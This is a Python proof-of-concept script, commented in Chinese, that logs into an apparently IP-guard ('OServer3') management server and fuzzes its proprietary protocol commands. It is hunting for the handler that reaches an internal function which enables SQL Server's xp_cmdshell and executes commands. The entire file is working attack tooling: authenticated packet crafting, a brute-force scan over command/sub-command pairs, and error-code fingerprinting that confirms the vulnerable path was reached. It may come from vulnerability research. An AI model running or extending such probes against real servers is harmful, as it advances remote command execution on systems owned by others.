"""poc_vuln_e_reach.py — VULN-E (sub_140A74BC0 xp_cmdshell) 可达性探测

目标:找出哪个 OCP cmd handler 调用了 sub_140A74BC0
方法:登录后 fuzz 所有 0x40xx cmd × sub 0-15,在每个 body 里塞一个 WCHAR* 路径,
      响应中匹配 sub_140A74BC0 的 7 种独特错误码组合作指纹。

sub_140A74BC0 内部返回的指纹:
    status  errno   errcode   含义
    16      5170    3133      input path is NULL/too short
    48      5150    3185      SQL Server version < 11.0
    48      5151    3203      SERVERPROPERTY('InstanceName') 查询失败
    48      5151    3225      xp_instance_regread @ServiceAccount 查询失败
    48      5152    3242      连接串不是 Integrated Security
    16      5173    3270      sp_configure xp_cmdshell=1 失败
    48      5153    3301      xp_cmdshell type nul / cacls 执行失败
    0       <other> 0         path write OK,xp_cmdshell 成功执行

只要 errno ∈ {5150,5151,5152,5153,5170,5173}, 就 100% 证明触达 sub_140A74BC0!

用法:
    python3 poc_vuln_e_reach.py 192.168.2.130 8236 Admin admin123456
"""
import os, socket, struct, sys, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ipguard_login.login import replay_login, SESSION_FP_DEFAULT
from ipguard_login.packet import (
    build_packet_with_state, recv_full_packet, parse_packet,
)

# sub_140A74BC0 输出指纹
FINGERPRINT_ERRNOS = {5150, 5151, 5152, 5153, 5170, 5173}
FINGERPRINT_CODES  = {3133, 3185, 3203, 3225, 3242, 3270, 3301}


def fresh_send(host, port, user, pwd, cmd, sub, body, flags=0x4600,
               timeout=10.0, retries=1):
    """Independent connection + login + send 1 cmd. Returns response dict."""
    base_nonce = struct.unpack("<I", os.urandom(3) + b"\x00")[0] | 0x00100000
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
    except Exception as e:
        return {"_err": f"connect: {e}"}
    try:
        idx, role, tok, _ = replay_login(
            s, user, pwd, base_nonce, show_crypto=False, verbose=False)
        nxt = (base_nonce + idx) & 0xFFFFFFFF
        pkt = build_packet_with_state(
            flags=flags, a2=cmd, a3=sub, nonce=nxt,
            sess_state_16_24=struct.pack("<II", role, tok),
            fp_lo=SESSION_FP_DEFAULT, fp_hi=SESSION_FP_DEFAULT,
            plain=body,
        )
        s.sendall(pkt)
        try:
            return parse_packet(recv_full_packet(s))
        except (socket.timeout, ConnectionError, OSError) as e:
            return {"_err": str(e)}
    except Exception as e:
        return {"_err": f"login: {e}"}
    finally:
        try: s.close()
        except: pass


def body_path_wcs(path: str) -> bytes:
    """sub=4 / sub=6 style body: DWORD reserved + WORD len + WORD 0 + wcs + NUL"""
    wcs = path.encode("utf-16-le")
    L = len(wcs) // 2
    return struct.pack("<IHH", 1, L, 0) + wcs + b"\x00\x00"


def body_path_with_v56v57(path: str, v56=1, v57=1) -> bytes:
    """sub=6 style body (path + 2 trailing DWORDs)"""
    wcs = path.encode("utf-16-le")
    L = len(wcs) // 2
    return (struct.pack("<IHH", 1, L, 0) + wcs + b"\x00\x00"
            + struct.pack("<II", v56, v57))


def body_raw_wcs(path: str) -> bytes:
    """Just the wcs with NUL terminator (simplest form)"""
    return path.encode("utf-16-le") + b"\x00\x00"


def extract_fingerprint(resp):
    """Look inside plain bytes for the 3-DWORD signature (status, errno, errcode).

    sub_140A74BC0 writes to its `a3` output struct:
      a3+0:  DWORD status (16 or 48)
      a3+4:  DWORD errno  (5150-5173)
      a3+16: DWORD errcode (3133-3301)

    The dispatcher serializes this struct into the OCP response body.
    We need to scan the bytes for these specific values.
    """
    if not resp or "_err" in resp:
        return None
    plain = resp.get("plain", b"")
    if not isinstance(plain, bytes) or len(plain) < 8:
        return None

    # Scan for any 4-byte DWORD that matches a fingerprint errno
    hits = []
    for i in range(0, len(plain) - 4, 4):
        v = struct.unpack("<I", plain[i:i+4])[0]
        if v in FINGERPRINT_ERRNOS:
            hits.append(("errno", v, i))
        elif v in FINGERPRINT_CODES:
            hits.append(("errcode", v, i))
    return hits if hits else None


def fmt_resp(resp):
    if resp is None: return "<None>"
    if "_err" in resp: return f"<err: {resp['_err'][:40]}>"
    fl = resp.get("flags", 0); plen = resp.get("payload_len", 0)
    plain = resp.get("plain", b"")
    if not isinstance(plain, bytes): plain = b""
    hx = plain[:48].hex() if plain else ""
    return f"flags=0x{fl:04x} plen={plen} plain[{len(plain)}B]={hx}"


def main():
    if len(sys.argv) < 5:
        print(__doc__); sys.exit(1)
    host, port = sys.argv[1], int(sys.argv[2])
    user, pwd = sys.argv[3], sys.argv[4]

    test_path = r"C:\OServer3_VULN_E_TEST"  # 攻击者后续要试的路径

    print(f"[*] target {host}:{port}")
    print(f"[*] login user={user!r}")
    print(f"[*] test path={test_path!r}\n")

    # 候选 cmd 范围 — 重点 0x4014 + 周围 + 已知 DB-related 4xxx
    candidate_cmds = (
        list(range(0x4010, 0x4020)) +  # 0x4014 邻近
        list(range(0x4040, 0x4050)) +  # 0x4042 邻近 (file ops)
        [0x4332, 0x4335, 0x4438, 0x4451, 0x4455,  # 已观察的 DB cmd
         0x4480, 0x4483, 0x4541, 0x4542, 0x4543,
         0x4610, 0x4710, 0x4715, 0x4731,
         0x4820, 0x4850, 0x4890, 0x48a0, 0x48d0, 0x48f0,
         0x4900, 0x4920]
    )

    # 3 种 body 编码 + 4 个不同路径
    payloads = [
        ("sub4-style",  body_path_wcs(test_path)),
        ("sub6-style",  body_path_with_v56v57(test_path, 1, 1)),
        ("raw-wcs",     body_raw_wcs(test_path)),
        ("empty",       b""),
    ]

    hits_total = []

    print("=" * 100)
    print(f"Scan: {len(candidate_cmds)} cmds × 16 subs × {len(payloads)} body fmts × 1 flags")
    print(f"      total {len(candidate_cmds) * 16 * len(payloads)} probes")
    print(f"Looking for response containing DWORD ∈ {sorted(FINGERPRINT_ERRNOS | FINGERPRINT_CODES)}")
    print("=" * 100)

    for cmd in candidate_cmds:
        for sub in range(16):
            for body_name, body in payloads:
                resp = fresh_send(host, port, user, pwd, cmd, sub, body,
                                  flags=0x4600, timeout=8.0)
                fp = extract_fingerprint(resp)
                if fp:
                    # 🎯 命中!
                    hits_total.append((cmd, sub, body_name, fp, resp))
                    print(f"\n  🎯 HIT cmd=0x{cmd:04x} sub=0x{sub:x} body={body_name}")
                    print(f"     fingerprints: {fp}")
                    print(f"     resp: {fmt_resp(resp)}")
                # 对崩溃响应保护
                if resp and "_err" in resp:
                    err = resp["_err"]
                    if "10054" in err or "10053" in err or "timeout" in err.lower():
                        print(f"  ⚠️  RST/timeout @ cmd=0x{cmd:04x} sub={sub} {body_name}")
                        time.sleep(2)

    print()
    print("=" * 100)
    print(f"SCAN COMPLETE — {len(hits_total)} hits across all payloads")
    print("=" * 100)
    if hits_total:
        print("\n候选 cmd/sub 路径(可触达 sub_140A74BC0):")
        seen = set()
        for cmd, sub, body_name, fp, resp in hits_total:
            key = (cmd, sub)
            if key not in seen:
                seen.add(key)
                errno_hits = [v for typ, v, _ in fp if typ == "errno"]
                code_hits = [v for typ, v, _ in fp if typ == "errcode"]
                print(f"  cmd=0x{cmd:04x} sub=0x{sub:x}: errno={errno_hits} errcode={code_hits}")
    else:
        print("\n(无命中 — VULN-E 不通过测试范围内的 cmd 触达;"
              "或需要不同的 body 编码 / flags / 权限级别)")


if __name__ == "__main__":
    main()
